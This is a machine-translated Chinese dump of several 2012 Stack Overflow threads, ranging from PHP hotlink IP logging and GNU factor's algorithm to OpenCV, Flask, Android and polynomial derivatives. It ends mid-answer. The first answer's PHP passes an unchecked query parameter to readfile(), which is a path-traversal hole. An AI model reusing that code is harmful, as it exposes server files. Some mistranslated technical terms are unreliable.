现在用户请求像 www.domain.com/images/image.jpg 这样的图像，它将重定向到 images.php 并跟踪他们的 ips。我在这里面临的问题是我的页面内部没有显示图像（原因 htaccess 将其重定向到 images.php）。我该如何解决这个问题？

[这是有关此问题的上一个问题的链接：](https://stackoverflow.com/questions/11141496/how-can-i-track-hot-linkers-ip-address-using-php)

我不是 htaccess 专家，所以需要更多解释

谢谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-22T11:41:01.360

如果您想记录 IP 然后无论如何提供图像，那么可能会这样做：

.htaccess 文件：

```
RewriteEngine on 
RewriteRule images/(.+)\.(jpg|gif|png) images.php?image=$1.$2 
```

图像.php：

```
<?php 
    $ipAddress = $_SERVER['REMOTE_ADDR'];

    $statement=$db->prepare("INSERT INTO `ipaddress` (`ip` )
            VALUES (?)");
    $statement->execute(array($ipAddress));

    $ext = strtolower(end(explode('.', $_GET['image'])));

    if($ext == 'gif') {
        $type = "gif";
    }
    else if($ext == 'jpg') {
        $type = "jpeg";
    }
    else if($text == 'png') {
        $type = "png";
    }
    else {
        $type = "binary";
    }

    header("Content-type: image/$type");
    readfile("images/" . $_GET['image']);

?> 
```

您可能需要在这里和那里调整路径以确保正确指向所有文件，无论是 in`.htaccess`还是 in `images.php`。

# linux - linux中factor命令背后的算法是什么？

> ID：11155331
> 
> 赞同：18
> 
> 时间：2012-06-22T11:29:29.970
> 
> 标签：linux, algorithm, command, prime-factoring, factorization

**该`factor`命令打印指定整数 NUMBER 的质因数。**

当我尝试它时

```
factor 12345678912345678912 
```

即使对于如此大的数字，它也会在工厂内产生。

**它使用的是哪种算法？**

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-06-22T11:36:39.857

Gnu coreutils 手册告知正在使用[Pollard 的 rho 算法。](http://en.wikipedia.org/wiki/Pollard%27s_rho_algorithm)

[http://www.gnu.org/software/coreutils/manual/html_node/factor-invocation.html](http://www.gnu.org/software/coreutils/manual/html_node/factor-invocation.html)

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-06-22T11:34:30.783

以下是 GNU 因子的一个版本的源代码示例：

[http://www.futuretg.com/FTHumanEvolutionCourse/Source/factor.c](http://www.futuretg.com/FTHumanEvolutionCourse/Source/factor.c)

它包括试验师和波拉德 rho 的例程。快速扫描在我看来，好像它使用试除法来查找一些小因素（最多约`lg(n)^2`，在这种情况下约为 4000），然后是 Pollard，如果剩下的可能不是素数。在这种情况下，`205432623008947`如果我对 4000 的看法是正确的，即`35129 * 5847949643`.

在您的示例中，第二大素数因子是，最大素数`35129`的平方根大约是`76471`。所以单试分裂会很快，因为它只需要尝试大约 25,000 名候选人。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2021-02-09T19:01:29.477

从[源代码](https://github.com/coreutils/coreutils/blob/master/src/factor.c#L38)：

> 算法：
> 
> 1.  使用一个小的素数表执行试除法，但没有硬件除法，因为素数表存储逆模词基。（此代码的 GMP 变体不使用预先计算的逆，而是依靠 GMP 进行快速可分性测试。）
> 2.  使用 Miller-Rabin 检测复合材料和 Lucas 检测素数来检查任何非因式分解部分的性质。
> 3.  使用 Pollard-Brent rho 算法分解任何剩余的复合零件，或者如果 USE_SQUFOF 定义为 1，请先尝试。使用 Miller-Rabin 和 Lucas 再次检查已发现因素的状态。
> 
> 我们更喜欢在除法中使用 Hensel 范数，而不是更熟悉的 Euclidian 范数，因为前者会导致更快的代码。在 Pollard-Brent rho 代码和主要测试代码中，我们使用 Montgomery 将所有 n 残基乘以词基的技巧，允许廉价的 Hensel 约简 mod n。
> 
> GMP 代码使用的算法可能要慢得多；例如，在大约 2017 年的 Intel Xeon Silver 4116 上，使用双字算法分解 2^{127}-3 大约需要 50 毫秒，但使用 GMP 代码大约需要 750 毫秒。

总的来说，`factor`速度快得令人愉悦。但是，这不是魔术。如果你选择病态难以分解的数字，它会显着减慢。

[RSA 加密](https://en.wikipedia.org/wiki/RSA_(cryptosystem))的底层安全性基于分解 2 个大的互质数的难度。所以让我们看看我们可以`factor`用大的互质推多难。能够分解的最大数`factor`是 2 ^(127) -1（可能在内部用 int64_t 表示），它恰好是素数：

```
$ factor $(bc <<< 2^127)
factor: ‘170141183460469231731687303715884105728’ is too large
$ factor $(bc <<< 2^127-1)
170141183460469231731687303715884105727: 170141183460469231731687303715884105727
$ factor $(bc <<< 2^127-2)
170141183460469231731687303715884105726: 2 3 3 3 7 7 19 43 73 127 337 5419 92737 649657 77158673929
$ 
```

2 ^(127) -1 和 2 ^(127) -2 几乎立即分解；很快发现2 ^(127) -1 是素数，而 2 ^(127) -2 的因数相对较小。

更难的东西呢？^(2 60)数量级的 2 个因子的乘积将接近可以处理的因子的更高阶。那么接下来的 2 个高于 2 ^(60)的素数呢？

```
$ primes $(bc <<< 2^60) | head -2
1152921504606847009
1152921504606847067
$ bc <<< 1152921504606847009*1152921504606847067
1329227995784916015866073631529372603
$ time factor 1329227995784916015866073631529372603
1329227995784916015866073631529372603: 1152921504606847009 1152921504606847067

real    0m30.628s
user    0m30.578s
sys 0m0.004s
$ 
```

因此，随着互质因子位数的增加，因式分解时间增加得更快。

# ruby-on-rails - rspec如何使用水豚查询html正文电子邮件

> ID：11155332
> 
> 赞同：2
> 
> 时间：2012-06-22T11:29:33.157
> 
> 标签：ruby-on-rails, rspec, capybara, bdd, actionmailer

也许这是新手问题，但我被困住了。我尝试用 capybara 查询 html 电子邮件，但没有运气。这是规格

```
# encoding: utf-8
require "spec_helper"
require "resque"
require "resque_spec"

describe 'MailerUtils in action'  do
  include MailerMacros

  let(:service_provider_email) { FactoryGirl.create(:service_provider_email) }
  let(:service_provider) { service_provider_email.service_provider }
  let(:service_provider_email_list) { service_provider_email.service_provider_email_list   }

  before :all do
    Resque.inline = true
  end

  describe 'send one marketing email and unsubscribe' do
    before :each do
      reset_email
      PromotionActions.perform :too_low_profile_score, service_provider.id
    end

    it "should have unsubscribe link" do
      last_email.body.should have_content("отписаться от рассылки")
    end

    it "should have correct city in link" do
      last_email.body.find(:xpath, "//a[@id=\"unsubscribe_link\"][@href=\"http://#{service_provider.city.name}.#{service_provider.country.domain}/#{service_provider.code}?uncheck=marketing]")
      end
    end
  end 
```

最后一个例子失败。如何从电子邮件中查询 html？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-06-22T12:25:04.467

```
Capybara.string(last_email.body).find(...) 
```

# image - OpenCV：使用 OpenCV 合并两个图像

> ID：11155333
> 
> 赞同：0
> 
> 时间：2012-06-22T11:29:33.247
> 
> 标签：image, image-processing, opencv, opencvdotnet

使框 2 的大小等于框 1 的最佳方法是什么，以便 CvCopy(); 可以应用：

![在此处输入图像描述](../Images/2ca64e384ae87f476c61a0fa8193d5f4.png)

**编辑：**

也许我没有正确地提出这个问题。所以我重新措辞。给定图像 2（如上所示），我想将其转换为如下所示：
![在此处输入图像描述](../Images/7996f41e5c66fdf78ce9392343f7c065.png)

基本上我必须在它上面添加一个黑色边框。调整大小将不起作用，因为我的图像会失真。换句话说，我必须在图像周围的定义厚度中添加零。

此外，虽然显示为空，但这些图像（框）内部可能有一些对象，我没有显示。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T15:56:04.063

您可以使用`copyMakeBorder`函数来执行此操作。我不知道dotnet，下面是python中的示例代码。另请访问上述功能的文档：[DOCS](http://docs.opencv.org/modules/imgproc/doc/filtering.html?highlight=cv2.copy#copymakeborder)

首先加载两个图像。`imb`是大图，`ims`是小图。

```
import cv2
import numpy as np

imb = cv2.imread('messi4.jpg')
ims = cv2.imread('template.jpg') 
```

现在让我们`rb,cb`成为大图像的行数和列数，`rs,cs`对于小图像也是如此。

```
rb,cb = imb.shape[:2]
rs,cs = ims.shape[:2] 
```

最后，要使用该`copyMakeBorder`功能，您需要在顶部、底部、左侧和右侧添加行数和列数。所以我们需要找到它们。

```
top = (rb-rs)/2
bottom = rb - rs - top
left = (cb-cs)/2
right = cb - cs - left 
```

最后应用函数。

```
res = cv2.copyMakeBorder(ims,top,bottom,left,right,cv2.BORDER_CONSTANT) 
```

现在看看结果：

**原始小图**：

![在此处输入图像描述](../Images/b396fb18d6b906ac9d6c009004adc3a8.png)

**修改后的新图像**：

![在此处输入图像描述](../Images/fec228fbd7b497a78990f6f69dae697f.png)

和我的大图一样大（这里没有展示，觉得没必要，如果你愿意，我可以上传）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-22T11:44:27.160

扩大较小的不是最好的主意，因为您会得到很多图像失真 - 如果最终尺寸不是问题，最好缩小较大的。

您可以使用`cv::resize( )`（这是 C++ 函数 - 我没有使用 OpenCV dot net）来调整图像大小。

实现细节 [在 API 中](http://opencv.itseez.com/modules/imgproc/doc/geometric_transformations.html#void%20resize%28InputArray%20src,%20OutputArray%20dst,%20Size%20dsize,%20double%20fx,%20double%20fy,%20int%20interpolation%29)。

在合并方面，这取决于您的定义，但简单地使用`cv::copy( )`不会这样做。文档中有关于图像合并的完整教程[，请点击此处](http://opencv.itseez.com/doc/tutorials/core/adding_images/adding_images.html)。

# python - 如何拆分字符串分隔的数字

> ID：11155339
> 
> 赞同：1
> 
> 时间：2012-06-22T11:30:08.300
> 
> 标签：python, string, split, python-2.7

我有一个用序数分隔的长字符串。例如：“1\. Good morning 2\. Hello 3\. Bye”（但开头不是必须有数字，我不知道有多少个数字，如果有的话。）我想得到像这样的列表：`["Good morning", "Hello", "Bye"]`

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-22T11:34:14.713

```
In [1]: s = '1\. Good morning 2\. Hello 3\. Bye'

In [2]: import re

In [3]: re.split('\d+\. ', s)
Out[3]: ['', 'Good morning ', 'Hello ', 'Bye'] 
```

如果开头没有数字，则第一个元素不会为空。但是，这并不能检查数字的顺序是否正确。让我知道这是否重要。

**编辑：**感谢**@glglgl**的评论。就前导/尾随空格而言，拆分`' *\d+\. *'`可能会更好。

# android - java.lang.IllegalAccessError：预验证类中的类引用解析为在运行测试项目时意外实现？

> ID：11155340
> 
> 赞同：31
> 
> 时间：2012-06-22T11:30:09.673
> 
> 标签：android, unit-testing, junit

我已经使用第三方库（zxing）在实现项目运行良好之后使用第三方库（zxing）实现了项目，然后在我编写了一个测试项目来对我的项目进行单元测试之后。运行测试项目后，主项目、类和它的方法没有给出任何错误，但是如果在主项目的该方法中使用了任何 zxing 框架类，则在运行时而不是编译时出现上述错误。请告诉我如何解决这个问题？

* * *

## 回答 #1

> 赞同：33
> 
> 时间：2012-11-26T10:45:41.013

由于第三方库引用添加了两次，您会收到此错误。您已在测试项目的构建路径中添加了应用程序路径。所以库引用自动添加到测试项目”。在属性-> android下删除测试项目中的任何库引用。

仅供参考， [请单击此处查看详细说明](http://juristr.com/blog/2010/06/android-instrumentation-test/)。

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2013-05-15T15:07:20.397

这是因为 zxing jar 文件被加载了两次，您必须在编译时将 zxing 库设置为“**提供**”（如果您使用 Maven 编译代码），因此它不会将该库添加到您的字节码中。这样你就不会得到错误

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2015-03-04T19:14:43.143

不幸的是，我见过的最好的解决方案是使用带有这些代码行的脚本并使用 Espresso v2.0：

```
adb shell setprop dalvik.vm.dexopt-flags v=n,o=v
adb shell stop installd
adb shell start installd 
```

在开始测试之前执行它。只需执行一次。

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2013-12-05T14:54:58.423

我在 Intelij Idea 中更改了测试项目设置。转到 Modules -> Dependencies，然后将测试项目的范围设置为“提供”。

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2014-09-16T13:09:17.383

我收到此错误是因为我正在使用番石榴，而 Espresso 也包含番石榴。

如果您使用 Gradle 和 Android Studio，您可以从依赖项中排除包，如下所示：

```
androidTestCompile('com.jakewharton.espresso:espresso:1.1-r3') {
   exclude group: 'com.google.guava'
} 
```

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2014-02-21T14:44:58.420

从 Eclipse 中项目的 Java 构建路径下的“订购和导出”选项卡中取消选中 jars（在我的情况下为地图和 google play services jar）。但让它们添加到“库”选项卡中。单击确定，清理项目并立即构建。有用。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2016-01-25T18:42:30.347

我有时会遇到这个错误。只是 build->clean 项目帮助了我

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2017-03-01T16:55:12.700

如果您不是特别需要 API 版本较低 (<=19) 的设备，您可以留下传递依赖并创建一个 API 版本较高的模拟器。

这只发生在 API 低于 Lollipop (API 21) 的设备上。在更高/等于 API 21 的模拟器上运行测试正常运行，没有问题。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2019-12-02T12:49:53.217

我在低于 21 的 api 级别上有这个错误。只是 build->rebuild 项目帮助了我。

# python - 如何在python中获取html数据

> ID：11155342
> 
> 赞同：-1
> 
> 时间：2012-06-22T11:30:15.380
> 
> 标签：python, html, flask

我有以下html代码

```
<html>

<head>
<script type="text/javascript">
function processdata()
{
var un=document.getElementById('uname1');
alert("hI " + un.value);
}
</script>
</head>

<body>
Username: <input type="text" name="uname" value=" " id="uname1">
<input type="button" name="sub" onclick="processdata();" value="Submit">

</body>

</html> 
```

这个 html 页面在 python/flask 中被调用，如下所示-

```
@app.route('/')
def getusername():
  return render_template('appHTML.html') 
```

现在我想在 python 变量中获取字段“uname”中的值。

请告诉我该怎么做。我没有使用 CGI。我用烧瓶代替。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-23T03:19:58.077

您的问题是您没有表单标签 - 因此默认情况下浏览器不会将任何内容提交回您的服务器。

让浏览器将表单提交到您的服务器的方法是将您的输入（文本和提交）包装在一个`<form>`标签中，该标签具有`action`指向您将接受响应的 URL 的属性。

所以你的代码看起来像这样（省略了包装代码）：

```
<form action="/process-form" method="post">
Username: <input type="text" name="uname" value=" " id="uname1">
<input type="button" name="sub" value="Submit">
</form> 
```

如果您愿意，您可以使用`method="get"`而不是`method="post"`，但 POST 通常是您正在寻找的。然后，您将设置您的应用程序以在您的端点处理发布请求：

```
from flask import Flask, request

app = Flask(__name__)

@app.route("/")
def index():
    return render_template("your_form_template.html")

@app.route("/process-form", methods=["POST"])
def process():
    username = request.form["uname"]
    return "Hello {}!".format(username) 
```

如果您希望能够将值异步发送回服务器（因此整个页面不会重新加载），那么您可以使用 Ajax 仅将值提交给服务器。您的页面将看起来相同 - 只需使用 JavaScript 阻止表单提交，然后使用 POST 方法将 XHR 请求提交回服务器。（如果这一切都非常令人困惑，您可能需要考虑选择一个库来帮助您抽象出浏览器之间的一些差异 - jQuery 现在很流行......如果有点过度推荐的话。）

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-06-22T11:49:25.560

这里有一些解析器的例子

```
from HTMLParser import HTMLParser
from htmlentitydefs import name2codepoint

class MyHTMLParser(HTMLParser):
    def handle_starttag(self, tag, attrs):
        print "Start tag:", tag
        for attr in attrs:
            print "     attr:", attr
    def handle_endtag(self, tag):
        print "End tag  :", tag
    def handle_data(self, data):
        print "Data     :", data
    def handle_comment(self, data):
        print "Comment  :", data
    def handle_entityref(self, name):
        c = unichr(name2codepoint[name])
        print "Named ent:", c
    def handle_charref(self, name):
        if name.startswith('x'):
            c = unichr(int(name[1:], 16))
        else:
            c = unichr(int(name))
        print "Num ent  :", c
    def handle_decl(self, data):
        print "Decl     :", data

parser = MyHTMLParser()

parser.feed('<h1>Python</h1>')
Start tag: h1
Data     : Python
End tag  : h1 
```

# struts2 - 按钮调用动作的struts标签

> ID：11155343
> 
> 赞同：3
> 
> 时间：2012-06-22T11:30:15.867
> 
> 标签：struts2, tags, struts, tld, struts-action

只是想知道是否有人见过或写过客户标签来调用 Struts2 Actions。

我正在寻找的是这样的： -

```
<s:button value="Click Me!" action="thisIsMyAction" >
    <s:param name="productId" value="%{productId}" />
    <s:param name="userId" value="%{userId}" />
</s:button> 
```

所以在你有的动作中

```
public String thisIsMyAction() {

   String productId = getServletRequest.getParameter("productId");
   String userId= getServletRequest.getParameter("userId");

   // Do some stuff here.

   return SUCCESS;
} 
```

原因是，我们不想使用 href 或图像，而且我们并不总是提交表单。

提前喝彩

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-22T12:29:21.697

您可以使用两个隐藏参数和一个提交类型按钮来创建一个表单。

```
<s:form action="myAction">
<s:hidden name="productId" value="%{productId}" />
<s:hidden name="userId" value="%{userId}" />
<s:submit  value="Click me!" type="button"/>
</s:form> 
```

在我的操作中，您使用相关的 getter 和 setter 声明属性 productId 和 userId。

# c++ - c++ 控制台应用程序，atof

> ID：11155349
> 
> 赞同：0
> 
> 时间：2012-06-22T11:30:45.477
> 
> 标签：c++, atof

我的问题如下。我尝试将字符串转换为双精度。这样：

```
string str = "1.1";
double d = atof(str.c_str()); 
```

但这不起作用，它只是返回 1；

但如果我尝试：

```
string str = "1,1";
double d = atof(str.c_str()); 
```

它返回 1.1。

这真的很奇怪。如果我写一个“，”但返回一个“。”，它似乎只能理解这个数字。

知道如何解决这个问题以转换“1.1”吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-22T11:33:30.140

该函数是区域设置感知的，因此它将根据您当前的区域设置解析数字。

由于`atof`是 C 库的一部分，您必须使用 C 库来更改设置。退房[`clocale`](http://www.cplusplus.com/reference/clibrary/clocale/)。

另请查看 C++ ，如果您使用 C++ 功能 ( , ) 来解析数据[`locale`](http://www.cplusplus.com/reference/std/locale/)，则应该使用它。您可以将语言环境设置为流，这样就不会像 C 那样修改全局语言环境。`string`[`istringstream`](http://www.cplusplus.com/reference/iostream/istringstream/)[`imbue`](http://www.cplusplus.com/reference/iostream/ios/imbue/)

# iphone - 同一个 XIB 中的多个视图。旋转视图和更改视图时的问题

> ID：11155351
> 
> 赞同：1
> 
> 时间：2012-06-22T11:30:50.220
> 
> 标签：iphone, xcode, uiview, rotation

我有个问题。我的 viewController 的 Xib 有多个 UIView。该应用程序以纵向模式启动，我可以将其旋转为横向。

```
- (BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation
{
    return YES; // (interfaceOrientation == UIInterfaceOrientationPortrait);

} 
```

当我处于横向模式并按下 UIButton 更改视图时，“新”视图仍处于纵向模式.. 这是更改视图的代码：

```
-(IBAction) gotogame
{
     self.view = gameView;
} 
```

我想在更改视图时看到正确的旋转视图怎么办？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-22T12:21:36.813

将此行添加到您的方法中

```
-(IBAction) gotogame
{
     self.view = gameView;
[[UIApplication sharedApplication] setStatusBarOrientation:UIDeviceOrientationLandscapeLeft animated:YES];
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-22T12:38:43.880

我试过这个，它对我有用：

```
UIView *newView = [[UIView alloc] init];
newView.backgroundColor = [UIColor grayColor];
newView.frame = self.view.bounds;
[self.view addSubview:newView]; 
```

# android - webview 在主布局下方显示网页

> ID：11155353
> 
> 赞同：0
> 
> 时间：2012-06-22T11:31:05.567
> 
> 标签：android, android-layout, android-webview

![在此处输入图像描述](../Images/3b31a28d28b52da1fad19e7dcddb0f87.png)

在这张图片中，我点击了 google 按钮，它在 webview 中显示了 google 网站，但它也显示了它上面的应用程序的主要布局（两个按钮）。我想在我点击 google 按钮时只点击网站应该出现在 webview 而不是它上面的按钮。这是我的 java 和 xml 代码。提前致谢。

```
public class TestinglinkActivity extends Activity {
     final Activity activity = this;
     WebView webview;

    private class MyWebViewClient extends WebViewClient {
        @Override
        public boolean shouldOverrideUrlLoading(WebView view, String url) {
            view.loadUrl(url);
            return true;

        }
    }

    @Override
    public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);

    webview = (WebView) findViewById(R.id.webview);
    webview.getSettings().setJavaScriptEnabled(true);
    webview.setWebViewClient(new MyWebViewClient());

    webview.setWebChromeClient(new WebChromeClient() {
        public void onProgressChanged(WebView view, int progress)
        {

            activity.setTitle("Loading...");
            activity.setProgress(progress * 100);

            if(progress == 100)
                activity.setTitle(R.string.app_name);
        }
    });

    Button btn_google = (Button) findViewById(R.id.btn_click_login);
    btn_google.setOnClickListener(new OnClickListener() {
         public void onClick(View v) {
             webview.loadUrl("http://www.google.com.pk");
             webview.goBack();
             webview.goForward();

          }
         }
     );

    Button btn_gmail = (Button) findViewById(R.id.btn_gmail);
    btn_gmail.setOnClickListener(new OnClickListener() {
         public void onClick(View v) {
             webview.loadUrl("http://www.gmail.com");
             webview.goBack();
             webview.goForward();

          }
         }
     );

           }   
};
} 
```

**xml**

```
<?xml version="1.0" encoding="utf-8"?> 

<ScrollView xmlns:android="http://schemas.android.com/apk/res/android"
             android:layout_width="fill_parent"
             android:layout_height="fill_parent" >  

<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:orientation="vertical">

    <Button 
            android:id="@+id/btn_click_login"
            android:layout_height="fill_parent"
            android:layout_width="fill_parent"
            android:layout_weight="2"
            android:text="Google"/>

    <Button 
            android:id="@+id/btn_gmail"
            android:layout_height="fill_parent"
            android:layout_width="fill_parent"
            android:layout_weight="2"
            android:text="Gmail"/>

  <WebView 
        android:id="@+id/webview"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content">
 </WebView>

</LinearLayout>

</ScrollView> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-22T11:53:53.843

使用下面的代码

```
btn_google = (Button) findViewById(R.id.btn_click_login);
btn_google.setOnClickListener(new OnClickListener() {
    public void onClick(View v) {
        webview.loadUrl("http://www.google.com.pk");
        webview.goBack();
        webview.goForward();
        TestinglinkActivity.this.btn_google.setVisibility(View.GONE);
        TestinglinkActivity.this.btn_gmail.setVisibility(View.GONE);
    }
});

btn_gmail = (Button) findViewById(R.id.btn_gmail);
btn_gmail.setOnClickListener(new OnClickListener() {
    public void onClick(View v) {
        webview.loadUrl("http://www.gmail.com");
        webview.goBack();
        webview.goForward();
        TestinglinkActivity.this.btn_google.setVisibility(View.GONE);
        TestinglinkActivity.this.btn_gmail.setVisibility(View.GONE);
    }
}); 
```

代替

```
Button btn_google = (Button) findViewById(R.id.btn_click_login);
btn_google.setOnClickListener(new OnClickListener() {
      public void onClick(View v) {
             webview.loadUrl("http://www.google.com.pk");
             webview.goBack();
             webview.goForward();
      }
});

Button btn_gmail = (Button) findViewById(R.id.btn_gmail);
btn_gmail.setOnClickListener(new OnClickListener() {
      public void onClick(View v) {
             webview.loadUrl("http://www.gmail.com");
             webview.goBack();
             webview.goForward();
      }
}); 
```

并在全球范围内声明按钮 btn_google 和 btn_gmail。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-22T11:47:59.243

使用 setVisibility(View.GONE) 在点击时隐藏按钮：

```
Button btn_gmail = (Button) findViewById(R.id.btn_gmail);
Button btn_google = (Button) findViewById(R.id.btn_click_login);
    btn_google.setOnClickListener(new OnClickListener() {
         public void onClick(View v) {

             webview.loadUrl("http://www.google.com.pk");
             btn_google.setVisibility(View.GONE);
             btn_gmail.setVisibility(View.GONE);
             webview.goBack();
             webview.goForward();

          }
         }
     ); 
```

# c#-4.0 - 如何从控制台应用程序退出并关闭 C# 中的窗口？

> ID：11155355
> 
> 赞同：-1
> 
> 时间：2012-06-22T11:31:06.737
> 
> 标签：c#-4.0, console-application

我已经为用户提供了一个选项，可以在 c# 中的控制台应用程序中选择退出选项，我在该按键中尝试过：

Environment.Exit(0);

但屏幕保持打开状态

有什么帮助吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2018-08-12T12:02:56.807

尝试这个。它应该进入应用程序的底部并退出。

```
return; 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-06-22T11:43:20.110

如果您的应用程序使用线程，则可能有一个线程在后台运行，使应用程序无法关闭。如果是这种情况，您可能希望将该线程的[`IsBackground`属性](http://msdn.microsoft.com/en-us/library/system.threading.thread.isbackground.aspx)设置为 true。即使线程仍在运行，这也将允许应用程序关闭。

从上面的链接：

> 线程要么是后台线程，要么是前台线程。后台线程与前台线程相同，只是后台线程不会阻止进程终止。一旦属于一个进程的所有前台线程都已终止，公共语言运行时就会结束该进程。任何剩余的后台线程都将停止并且不会完成。

# asp.net - 如何在网格视图中对列进行排序

> ID：11155361
> 
> 赞同：0
> 
> 时间：2012-06-22T11:31:15.553
> 
> 标签：asp.net

我试过这个

```
<asp:GridView ID="GvDetails" **runat="server" Width="100%" AutoGenerateColumns="False"
    AllowPaging="True" CssClass="clGrid" PageSize="25" OnRowEditing="GvDetails_RowEditing"
     OnRowCommand="GvDetails_RowCommand"  OnPageIndexChanging="GvDetails_PageIndexChanging"
     EnableModelValidation="True"  AllowSorting="true" EnableSortingAndPagingCallbacks="true"
    onselectedindexchanged="GvDetails_SelectedIndexChanged">
    <Columns>

     <asp:BoundField DataField="Name" HeaderText="Name" SortExpression="Name" >
        <HeaderStyle Width="35%" CssClass="gridHeader"></HeaderStyle>
                                <ItemStyle CssClass="gridItem" HorizontalAlign="Left"></ItemStyle>
      </asp:BoundField>
     </Columns>
</asp:GridView> 
```

但不工作:(

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-22T13:55:23.033

`DataSource`如果要在`GridView`.

Telerik 和 DevExpress 的控件可以为您执行此操作，但您必须为此付费。

幸运的是，排序`DataSource`非常容易。

```
<asp:Button ID="btSort" runat="server">Sort Alphabetically</asp:Button> 
```

然后点击甚至调用这个排序函数

```
 public void SortAlphabetically()
    {
        List<string> names = // However you get your names

        // Sort from A-Z using Linq
        var sort = from s in names
                   orderby s
                   select s;

        // Set the DataSource and Bind the data
        GvDetails.DataSource = sort;
        GvDetails.DataBind();
    } 
```

# text - cscope，查找 2 字节语言的文本？

> ID：11155363
> 
> 赞同：0
> 
> 时间：2012-06-22T11:31:22.163
> 
> 标签：text, emacs, find, cscope

我有时需要查找不是英文的文本（注释或字符串文字）。
(韩文/日文..等)

有人在索引/查找外语方面取得了成功吗？

# python - 求多项式的导数

> ID：11155367
> 
> 赞同：10
> 
> 时间：2012-06-22T11:31:39.100
> 
> 标签：python, math

我想知道如何将多项式解析为函数并返回导数。我将使用什么数据结构或方法来解析多项式？最好不使用任何库，因为这个问题可能会在技术面试中弹出。

```
polynomial-> of nth degree

def derivative(polynomial):
    return derivative

Example:

f(x)  = 2x^2+3x+1
f'(x) = 4x+3 
```

我不想要一个解决方案，这不是家庭作业，而是我将从哪里开始的提示。

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-06-22T12:16:04.273

单个变量中的多项式可以简单地表示为包含系数的数组。因此，例如 1 + 5x ³ - 29x ⁵可以表示为`[1, 0, 0, 5, 0, -29]`。以这种形式表示，导数很容易计算。

假设`poly`是上面的python列表。然后

```
deriv_poly = [poly[i] * i for i in range(1, len(poly))] 
```

对于稀疏多项式，其他表示相对容易，例如对列表`(coefficient, exponent)`或将指数映射到系数的字典。

解析表达式比较复杂，但是使用各种解析框架应该很容易，因为语法比较简单。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-06-22T12:08:39.143

我现在想出了这个。你想要的是这样的：

1.  解析多项式：您需要有一个预定义的模式。输入越“不受信任”或“狂野”，您就必须更好地解析它。你可以使用正则表达式。

2.  列出方程（coeff, power_of_x）的基本组成部分。

3.  做数学（导数公式）

4.  以输入的方式返回一个方程。

这给了你：

```
import re

def read(eq):
    terms = eq.split('+')
    equation = [re.split('x\^?', t) for t in terms]
    eq_map = []
    for e in equation:
        try:
            coeff = int(e[0])
        except ValueError:
            coeff = 1
        try:
            power = int(e[1])
        except ValueError:
            power = 1
        except IndexError:
            power = 0
        eq_map.append((coeff, power))
    return eq_map

def write(eq_map):
    def str_power(p):
        if p == 0:
            return ''
        elif p == 1:
            return 'x'
        else:
            return 'x^%d' % (p,)

    def str_coeff(c):
        return '' if c == 1 else str(c)
    str_terms = [(str_coeff(c) + str_power(p)) for c, p in eq_map]
    return "+".join(str_terms)

def derivative(eq):
    eq_map = read(eq)
    der_map = [(p*c, p-1) for c, p in eq_map[:-1]]
    return write(der_map)

def run(eq):
    print eq, '->', derivative(eq)

run("2x^2+3x+1")
run("x^3+2x^2+1") 
```

这是非常基本的。例如：`2*x^3`不会因为“*”而工作。当然，在很多情况下它不起作用，但这是基本思想。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-06-22T11:35:26.510

根据我的经验，矩阵在表示多项式时通常非常有用

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-06-22T11:40:39.377

好吧，我相信起点是定义表达式的基本组成部分。

当您查看一个函数并想要这样处理它时，它基本上是一种语法，它可能会有点复杂，具体取决于您想要允许多少细节。

你的语法有 EXPRESSION 的形式。

EXPRESSION 可以是：TERM（您的函数基本上类似于 nx^y）或 TERM OPERATOR EXPRESSION

如果您可以解析这样的函数，您只需要定义处理 TERM 的规则，然后递归地对表达式的其余部分应用相同的方法。

您的多项式将始终具有 nx^y 的形式，对于 y 为 0 或 1 或 n 为 1 且被省略的情况进行了一些简化。

这就是我在不使用任何额外库的情况下处理它的方式。如果您愿意，我可以尝试进一步解释我的观点。

顺便说一句，我知道我的回答并没有完全解决 Python 或要使用的数据结构，但它是解决此类问题的一种可能方法。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-06-22T12:29:21.970

我的解决方案使用迭代，其中第 i 个元素是 x^i 的系数，因此对于*p(x) = 3*x^5 + 2*x^3 + x^2 + 5*，输入将是`[5, 0, 1, 2, 0, 3]`. 导数是*p'(x) = 15*x^4 + 6*x^2 + 2*x*，所以预期的结果应该是`[0, 2, 6, 0, 15]`。

```
>>> import itertools, operator
>>> coeff = [5, 0, 1, 2, 0, 3]
